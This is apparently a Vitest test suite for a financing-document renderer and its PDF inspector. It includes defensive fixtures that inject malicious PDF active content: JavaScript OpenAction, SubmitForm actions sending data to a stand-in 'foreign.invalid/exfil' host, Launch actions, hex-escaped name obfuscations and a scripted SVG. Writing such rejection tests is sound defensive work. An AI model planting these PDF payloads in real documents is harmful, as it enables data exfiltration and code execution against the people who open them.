import { beforeAll, describe, it, expect, vi } from "vitest";
import { readFile, mkdir, writeFile, mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PDFDocument, PDFName, PDFDict, PDFString, PDFRawStream } from "pdf-lib";
import type { FinancingReleaseRenderInput } from "@oalo/application";
import { chromium } from "@playwright/test";
import sharp from "sharp";
import { outputFixture, longOutputFixture } from "./financing-release-output-fixture.js";
import { validateFinancingOutputInput, outputDigest } from "./financing-release-html.js";
import {
  createPublicFinancingOutputRenderer,
  assertPublicFinancingNormalizedMedia,
} from "./financing-release-render.js";
import { inspectFinancingReleasePdf, assertFinancingPdfParity } from "./financing-release-pdf.js";
// Test reruns must preserve the independently frozen output originals and their manifest.
const captureRoot = await mkdtemp(join(tmpdir(), "oalo-financing-output-repair-"));
describe("public financing output authority", () => {
  it("refuses a changed visible rate even when its original private source remains valid", () => {
    const input = outputFixture();
    input.presentation.financing.scenarios[0]!.quote.noteRateMilliPercent += 1;
    expect(() => validateFinancingOutputInput(input)).toThrow();
  });
  it("refuses substituted identity, disclosure, totals and canonical origin", () => {
    for (const mutate of [
      (i: FinancingReleaseRenderInput) => {
        i.presentation.identities.lender.name = "Another LO";
      },
      (i: FinancingReleaseRenderInput) => {
        i.presentation.disclosureText = "Altered disclosure";
      },
      (i: FinancingReleaseRenderInput) => {
        i.presentation.calculated.scenarios[0]!.cashToCloseMinor = 1;
      },
      (i: FinancingReleaseRenderInput) => {
        return { ...i, canonicalUrl: "https://foreign.invalid/p/" + i.publicationId };
      },
    ]) {
      const input = outputFixture();
      expect(() => validateFinancingOutputInput(mutate(input) ?? input)).toThrow();
    }
  });
  it("renders and extracts real browser PDF/site bytes and rejects changed text/link/structure", async () => {
    const input = outputFixture(),
      readMedia = vi.fn(),
      fontBytes = new Uint8Array(
        await readFile("apps/web/public/fonts/webinar/AutomatedLOWebinarInter.ttf"),
      );
    const renderer = createPublicFinancingOutputRenderer({ readMedia, fontBytes });
    const outputs = (await renderer.render(input)) as readonly {
      kind: "site" | "pdf";
      bytes: Uint8Array;
      mimeType: string;
    }[];
    await mkdir(captureRoot, { recursive: true });
    expect(outputs.map((o) => o.mimeType)).toEqual(["text/html", "application/pdf"]);
    for (const output of outputs)
      await renderer.assertOutputParity(input, output.kind, output.bytes);
    expect(readMedia).not.toHaveBeenCalled();
    const pdf = outputs[1]!.bytes,
      site = outputs[0]!.bytes,
      inspection = await inspectFinancingReleasePdf(pdf);
    expect(inspection.text).toContain("6.250%");
    expect(inspection.links).toEqual([input.canonicalUrl]);
    for (const [before, after] of [
      ["6.250%", "6.251%"],
      ["Synthetic", "Tampered"],
      ["financing-public", "bad"],
      [input.canonicalUrl, "https://foreign.invalid/"],
    ] as const) {
      const html = new TextDecoder().decode(site);
      if (!html.includes(before)) continue;
      await expect(
        renderer.assertOutputParity(
          input,
          "site",
          new TextEncoder().encode(html.replace(before, after)),
        ),
      ).rejects.toThrow();
    }
    const changed = structuredClone(input);
    changed.presentation.financing.scenarios[0]!.quote.aprMilliPercent = 6251;
    await expect(assertFinancingPdfParity(changed, pdf)).rejects.toThrow();
    const modified = await PDFDocument.load(pdf);
    const annotation = modified.getPages().flatMap((p) => p.node.Annots()?.asArray() ?? [])[0]!;
    const dict = modified.context.lookup(annotation, PDFDict);
    dict
      .lookup(PDFName.of("A"), PDFDict)
      .set(PDFName.of("URI"), PDFString.of("https://foreign.invalid/"));
    await expect(
      assertFinancingPdfParity(input, await modified.save({ useObjectStreams: false })),
    ).rejects.toThrow();
    modified.catalog.set(
      PDFName.of("OpenAction"),
      modified.context.obj({ S: "JavaScript", JS: "alert(1)" }),
    );
    await expect(
      inspectFinancingReleasePdf(await modified.save({ useObjectStreams: false })),
    ).rejects.toThrow();
    await expect(
      inspectFinancingReleasePdf(new TextEncoder().encode("%PDF-1.7\n/Encrypt\n%%EOF")),
    ).rejects.toThrow();
    await expect(inspectFinancingReleasePdf(site)).rejects.toThrow();
    const root = captureRoot;
    await mkdir(root, { recursive: true });
    await writeFile(`${root}/text-only-site.html`, site);
    await writeFile(`${root}/text-only-report.pdf`, pdf);
    const browser = await chromium.launch({ headless: true });
    try {
      for (const width of [1440, 390]) {
        const page = await browser.newPage({ viewport: { width, height: 900 } });
        await page.setContent(new TextDecoder().decode(site));
        await page.evaluate(() => document.fonts.ready);
        expect(
          await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth),
        ).toBe(true);
        await page.screenshot({ path: `${root}/text-only-${width}.png`, fullPage: true });
        await page.close();
      }
    } finally {
      await browser.close();
    }
  }, 60000);
  it("preserves actual three/five-scenario rows and six approved photo pixels, refusing a replaced PDF image", async () => {
    const images: { bytes: Uint8Array; sha256: string; mimeType: "image/png" }[] = [];
    for (let i = 0; i < 10; i++) {
      const bytes = new Uint8Array(
        await sharp({
          create: {
            width: 400,
            height: 400,
            channels: 3,
            background: { r: 30 + i * 25, g: 80 + i * 10, b: 180 - i * 15 },
          },
        })
          .png()
          .toBuffer(),
      );
      images.push({ bytes, sha256: outputDigest(bytes), mimeType: "image/png" as const });
    }
    const fontBytes = new Uint8Array(
      await readFile("apps/web/public/fonts/webinar/AutomatedLOWebinarInter.ttf"),
    );
    for (const count of [3, 5]) {
      const selected = count === 3 ? images.slice(0, 6) : images;
      const input = outputFixture(count, selected),
        readMedia = vi.fn(async (asset) => selected.find((i) => i.sha256 === asset.sha256)!.bytes);
      const renderer = createPublicFinancingOutputRenderer({ readMedia, fontBytes });
      const outputs = (await renderer.render(input)) as readonly {
        kind: "site" | "pdf";
        bytes: Uint8Array;
      }[];
      await writeFile(join(captureRoot, "photo-diagnostic.pdf"), outputs[1]!.bytes);
      for (const output of outputs)
        await renderer.assertOutputParity(input, output.kind, output.bytes);
      const root = captureRoot;
      await writeFile(`${root}/photos-${count}-report.pdf`, outputs[1]!.bytes);
      await writeFile(`${root}/photos-${count}-site.html`, outputs[0]!.bytes);
      const pdf = await PDFDocument.load(outputs[1]!.bytes);
      const [ref, image] = pdf.context
        .enumerateIndirectObjects()
        .find(
          ([, obj]) =>
            obj instanceof PDFRawStream &&
            obj.dict.lookup(PDFName.of("Subtype"))?.toString() === "/Image",
        )!;
      if (!(image instanceof PDFRawStream)) throw new Error("Actual image missing");
      pdf.context.assign(
        ref,
        pdf.context.flateStream(new Uint8Array(400 * 400 * 3), {
          Type: "XObject",
          Subtype: "Image",
          Width: 400,
          Height: 400,
          ColorSpace: "DeviceRGB",
          BitsPerComponent: 8,
        }),
      );
      await expect(
        renderer.assertOutputParity(input, "pdf", await pdf.save({ useObjectStreams: false })),
      ).rejects.toThrow();
      const browser = await chromium.launch({ headless: true });
      try {
        for (const width of [1440, 390]) {
          const page = await browser.newPage({ viewport: { width, height: 900 } });
          let external = 0;
          await page.route("**/*", async (route) => {
            const url = route.request().url();
            if (url === input.canonicalUrl) {
              await route.fulfill({
                body: Buffer.from(outputs[0]!.bytes),
                contentType: "text/html",
              });
              return;
            }
            const token = input.source.authority.mediaAuthorizations.findIndex((a, i) =>
              url.endsWith(outputDigest(`${input.publicationId}:${i}:${a.sha256}:${a.purpose}`)),
            );
            if (token >= 0) {
              await route.fulfill({
                body: Buffer.from(images[token]!.bytes),
                contentType: "image/png",
              });
              return;
            }
            external++;
            await route.abort();
          });
          await page.goto(input.canonicalUrl);
          await page.evaluate(async () => {
            await document.fonts.ready;
            for (const image of document.images) await image.decode();
          });
          expect(external).toBe(0);
          expect(
            await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth),
          ).toBe(true);
          await page.screenshot({ path: `${root}/photos-${count}-${width}.png`, fullPage: true });
          await page.close();
        }
      } finally {
        await browser.close();
      }
    }
  }, 90000);
  it("decodes real normalized JPEG and rejects SVG, wrong MIME, metadata, unsupported version and private-only rights", async () => {
    const bytes = new Uint8Array(
      await sharp({ create: { width: 400, height: 400, channels: 3, background: "#4e7196" } })
        .jpeg({ quality: 90, mozjpeg: true })
        .toBuffer(),
    );
    const input = outputFixture(1, [
        { bytes, sha256: outputDigest(bytes), mimeType: "image/jpeg" },
      ]),
      asset = input.source.authority.mediaAuthorizations[0]!;
    expect(await assertPublicFinancingNormalizedMedia(asset, bytes)).toEqual({
      width: 400,
      height: 400,
    });
    for (const mutate of [
      { ...asset, mimeType: "image/png" },
      { ...asset, normalizationVersion: "future" },
      { ...asset, scope: "tenant-private-financing" },
      { ...asset, authority: { ...asset.authority, channels: ["site"] } },
    ])
      await expect(
        assertPublicFinancingNormalizedMedia(mutate as typeof asset, bytes),
      ).rejects.toThrow();
    const svg = new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg"><script/></svg>');
    await expect(
      assertPublicFinancingNormalizedMedia(
        {
          ...asset,
          byteSize: svg.length,
          sha256: outputDigest(svg),
          authority: { ...asset.authority, contentHash: outputDigest(svg) },
        },
        svg,
      ),
    ).rejects.toThrow();
    const withMetadata = new Uint8Array(
      await sharp(Buffer.from(bytes)).withMetadata().jpeg().toBuffer(),
    );
    await expect(
      assertPublicFinancingNormalizedMedia(
        {
          ...asset,
          byteSize: withMetadata.length,
          sha256: outputDigest(withMetadata),
          authority: { ...asset.authority, contentHash: outputDigest(withMetadata) },
        },
        withMetadata,
      ),
    ).rejects.toThrow();
    const renderer = createPublicFinancingOutputRenderer({ readMedia: async () => bytes });
    const outputs = (await renderer.render(input)) as readonly {
      kind: "site" | "pdf";
      bytes: Uint8Array;
    }[];
    await renderer.assertOutputParity(input, "pdf", outputs[1]!.bytes);
    await writeFile(join(captureRoot, "jpeg-report.pdf"), outputs[1]!.bytes);
  }, 60000);
  it("retains long description, identity, consent and disclosure across actual extended output pages", async () => {
    const input = longOutputFixture(),
      renderer = createPublicFinancingOutputRenderer({
        readMedia: async () => {
          throw new Error("No media selected");
        },
      });
    const outputs = (await renderer.render(input)) as readonly {
      kind: "site" | "pdf";
      bytes: Uint8Array;
    }[];
    for (const output of outputs)
      await renderer.assertOutputParity(input, output.kind, output.bytes);
    const inspection = await inspectFinancingReleasePdf(outputs[1]!.bytes);
    expect(inspection.pageCount).toBeGreaterThan(9);
    expect(inspection.pageCount).toBeLessThanOrEqual(64);
  }, 60000);
});

describe("actual PDF active-action boundary", () => {
  let original: Uint8Array;
  let originalInput: FinancingReleaseRenderInput;
  beforeAll(async () => {
    originalInput = outputFixture();
    const outputs = (await createPublicFinancingOutputRenderer({
      readMedia: async () => {
        throw new Error("Text-only case has no media");
      },
    }).render(originalInput)) as readonly { bytes: Uint8Array }[];
    original = outputs[1]!.bytes;
  }, 60000);
  async function mutate(work: (pdf: PDFDocument, action: PDFDict) => void) {
    const pdf = await PDFDocument.load(original);
    const reference = pdf.getPages().flatMap((page) => page.node.Annots()?.asArray() ?? [])[0]!;
    const action = pdf.context.lookup(reference, PDFDict).lookup(PDFName.of("A"), PDFDict);
    work(pdf, action);
    return pdf.save({ useObjectStreams: false });
  }
  function replaceName(bytes: Uint8Array, placeholder: string, encoded: string) {
    const changed = Buffer.from(bytes),
      token = Buffer.from(`/${placeholder}`),
      at = changed.indexOf(token);
    expect(at).toBeGreaterThan(0);
    expect(changed.indexOf(token, at + token.length)).toBe(-1);
    expect(encoded.length).toBe(token.length);
    Buffer.from(encoded).copy(changed, at);
    return changed;
  }
  it.each([
    "/#4fpenAction",
    "/#4FpenAction",
    "/Op#65nAct#69on",
    "/#4f#70enAction",
    "/#41A",
    "/#4aS",
    "/Ty#70e",
    "/#53",
    "/UR#49",
    "/#23Action",
    "/Invalid#xz",
    "/Trailing#",
    "/#00",
    "/# ",
  ])("rejects unsupported raw escaped name %s before parser normalization", async (encoded) => {
    const placeholder = "Z".repeat(encoded.length - 1);
    const changed = await mutate((pdf) => {
      pdf.catalog.set(
        PDFName.of(placeholder),
        pdf.context.obj({ S: "SubmitForm", F: "https://foreign.invalid/exfil" }),
      );
    });
    await expect(
      inspectFinancingReleasePdf(replaceName(changed, placeholder, encoded)),
    ).rejects.toThrow();
  });
  it.each(["inline", "indirect", "array"])(
    "rejects an escaped action key in an actual %s descendant",
    async (shape) => {
      const changed = await mutate((pdf) => {
        const holder = pdf.context.obj({
          XXOpenAction: { S: "SubmitForm", F: "https://foreign.invalid/exfil" },
        });
        const reference = shape === "inline" ? holder : pdf.context.register(holder);
        pdf.catalog.set(
          PDFName.of("NestedQualification"),
          pdf.context.obj({
            Items: shape === "array" ? [reference] : reference,
          }),
        );
      });
      await expect(
        inspectFinancingReleasePdf(replaceName(changed, "XXOpenAction", "/#4fpenAction")),
      ).rejects.toThrow();
    },
  );
  it.each(["/Act#69on", "/Act#6fon", "/#55RI"])(
    "rejects unsupported escaped action value %s",
    async (encoded) => {
      const placeholder = "Z".repeat(encoded.length - 1);
      const changed = await mutate((pdf) => {
        pdf.catalog.set(
          PDFName.of("NestedQualification"),
          pdf.context.obj({
            Type: placeholder,
            S: "SubmitForm",
            F: "https://foreign.invalid/exfil",
          }),
        );
      });
      await expect(
        inspectFinancingReleasePdf(replaceName(changed, placeholder, encoded)),
      ).rejects.toThrow();
    },
  );
  it.each(["/S ", "/#53"])(
    "rejects duplicate or escaped-colliding action keys %s before dictionary overwrite",
    async (encoded) => {
      const placeholder = "Z".repeat(encoded.length - 1);
      const changed = await mutate((pdf, action) => {
        const ambiguous = pdf.context.obj({
          [placeholder]: "Launch",
          S: "URI",
          URI: action.lookup(PDFName.of("URI")),
        });
        pdf.catalog.set(PDFName.of("NestedQualification"), pdf.context.obj({ A: ambiguous }));
      });
      await expect(
        inspectFinancingReleasePdf(replaceName(changed, placeholder, encoded)),
      ).rejects.toThrow();
    },
  );
  it("allows escaped-name-looking literal strings and stream bytes without interpreting their contents as names", async () => {
    const baseline = await inspectFinancingReleasePdf(original);
    const changed = await mutate((pdf) => {
      const literal = "/#4fpenAction /#53 /S /Launch << /AA 1 >>";
      pdf.catalog.set(PDFName.of("QualificationText"), PDFString.of(literal));
      const bytes = new TextEncoder().encode(literal);
      const stream = PDFRawStream.of(pdf.context.obj({ Length: bytes.length }), bytes);
      pdf.catalog.set(PDFName.of("QualificationStream"), pdf.context.register(stream));
    });
    expect(await inspectFinancingReleasePdf(changed)).toEqual(baseline);
    await assertFinancingPdfParity(originalInput, changed);
  });
  it.each(["/Ty#70e", "/#53", "/UR#49"])(
    "rejects escaped allowed-action key %s even when the selected URI is canonical",
    async (encoded) => {
      const key = encoded === "/Ty#70e" ? "Type" : encoded === "/#53" ? "S" : "URI";
      const placeholder = "Z".repeat(encoded.length - 1);
      const changed = await mutate((_pdf, action) => {
        const value = key === "Type" ? PDFName.of("Action") : action.get(PDFName.of(key))!;
        action.delete(PDFName.of(key));
        action.set(PDFName.of(placeholder), value);
      });
      await expect(
        inspectFinancingReleasePdf(replaceName(changed, placeholder, encoded)),
      ).rejects.toThrow();
    },
  );
  it("rejects malformed dictionary names, unterminated dictionaries and inexact stream lengths", async () => {
    const malformed = await mutate((pdf) =>
      pdf.catalog.set(PDFName.of("QualificationName"), pdf.context.obj({ ZZZZZZ: 0 })),
    );
    for (const token of [" NotKey", "/Bad<>>"])
      await expect(
        inspectFinancingReleasePdf(replaceName(malformed, "ZZZZZZ", token)),
      ).rejects.toThrow();
    const stream = await mutate((pdf) => {
      const bytes = new TextEncoder().encode("bounded stream");
      pdf.catalog.set(
        PDFName.of("QualificationStream"),
        pdf.context.register(PDFRawStream.of(pdf.context.obj({ Length: 1 }), bytes)),
      );
    });
    const inexact = Buffer.from(stream),
      streamAt = inexact.indexOf(Buffer.from("bounded stream")),
      lengthAt = inexact.lastIndexOf(Buffer.from("/Length 14"), streamAt);
    expect(lengthAt).toBeGreaterThan(0);
    Buffer.from("/Length 13").copy(inexact, lengthAt);
    await expect(inspectFinancingReleasePdf(inexact)).rejects.toThrow();
    const truncated = Buffer.from(malformed);
    const at = truncated.indexOf(Buffer.from("/ZZZZZZ"));
    expect(at).toBeGreaterThan(0);
    await expect(
      inspectFinancingReleasePdf(
        Buffer.concat([truncated.subarray(0, at + 7), Buffer.from("\n%%EOF")]),
      ),
    ).rejects.toThrow();
  });
  it.each(["inline", "indirect", "array-inline", "array-indirect"])(
    "rejects canonical URI followed by a %s SubmitForm chain",
    async (shape) => {
      const changed = await mutate((pdf, action) => {
        const submit = pdf.context.obj({
          S: "SubmitForm",
          F: { FS: "URL", F: "https://foreign.invalid/exfil" },
          Flags: 0,
        });
        const reference = shape.includes("indirect") ? pdf.context.register(submit) : submit;
        action.set(
          PDFName.of("Next"),
          shape.startsWith("array") ? pdf.context.obj([reference]) : reference,
        );
      });
      await expect(inspectFinancingReleasePdf(changed)).rejects.toThrow();
    },
  );
  it.each([
    "GoTo",
    "GoToR",
    "GoToE",
    "Launch",
    "SubmitForm",
    "ResetForm",
    "ImportData",
    "Hide",
    "Named",
    "SetOCGState",
    "Rendition",
    "Sound",
    "Movie",
    "Thread",
    "Trans",
    "GoTo3DView",
  ])("rejects unsupported %s action selected by the actual annotation", async (kind) => {
    const changed = await mutate((_pdf, action) => {
      action.set(PDFName.of("S"), PDFName.of(kind));
    });
    await expect(inspectFinancingReleasePdf(changed)).rejects.toThrow();
  });
  it.each(["inline", "indirect", "array"])(
    "rejects unsupported nested %s typed action outside the immediate annotation",
    async (shape) => {
      const changed = await mutate((pdf) => {
        const unsupported = pdf.context.obj({
          Type: "Action",
          S: "Launch",
          F: "https://foreign.invalid/action",
        });
        const reference = shape === "inline" ? unsupported : pdf.context.register(unsupported);
        pdf.catalog.set(
          PDFName.of("NestedQualification"),
          pdf.context.obj({ Holder: [{ Child: shape === "array" ? [reference] : reference }] }),
        );
      });
      await expect(inspectFinancingReleasePdf(changed)).rejects.toThrow();
    },
  );
  it("rejects chained canonical URI, empty chains, unexpected action fields and cyclic references", async () => {
    for (const shape of ["canonical", "empty", "extra", "cycle"]) {
      const changed = await mutate((pdf, action) => {
        if (shape === "extra") action.set(PDFName.of("IsMap"), pdf.context.obj(true));
        else if (shape === "empty") action.set(PDFName.of("Next"), pdf.context.obj([]));
        else if (shape === "cycle") action.set(PDFName.of("Next"), pdf.context.register(action));
        else
          action.set(
            PDFName.of("Next"),
            pdf.context.obj({ S: "URI", URI: action.lookup(PDFName.of("URI")) }),
          );
      });
      await expect(inspectFinancingReleasePdf(changed)).rejects.toThrow();
    }
  });
  it("rejects inline additional-action maps that indirect-object scanning missed", async () => {
    const changed = await mutate((pdf) => {
      pdf.catalog.set(
        PDFName.of("NestedQualification"),
        pdf.context.obj({
          Items: [{ AA: { E: { S: "SubmitForm", F: "https://foreign.invalid/submit" } } }],
        }),
      );
    });
    await expect(inspectFinancingReleasePdf(changed)).rejects.toThrow();
  });
  it("allows the actual canonical URI and ordinary nested structure S names", async () => {
    const baseline = await inspectFinancingReleasePdf(original);
    const changed = await mutate((pdf) =>
      pdf.catalog.set(
        PDFName.of("NestedQualification"),
        pdf.context.obj({
          Items: [
            { Type: "StructElem", S: "Span", A: { O: "Layout", SpaceBefore: 0 } },
            { S: "Document" },
          ],
        }),
      ),
    );
    expect(await inspectFinancingReleasePdf(changed)).toEqual(baseline);
    await assertFinancingPdfParity(originalInput, changed);
  });
  it("checks every recognized URI action against the exact approved canonical URL", async () => {
    const foreign = `https://foreign.invalid/p/${originalInput.publicationId}`;
    const changed = await mutate((pdf) =>
      pdf.catalog.set(
        PDFName.of("NestedQualification"),
        pdf.context.obj({ Holder: { A: { S: "URI", URI: PDFString.of(foreign) } } }),
      ),
    );
    const inspection = await inspectFinancingReleasePdf(changed);
    expect(inspection.links).toContain(originalInput.canonicalUrl);
    expect(inspection.links).toContain(foreign);
    await expect(assertFinancingPdfParity(originalInput, changed)).rejects.toThrow();
  });
});
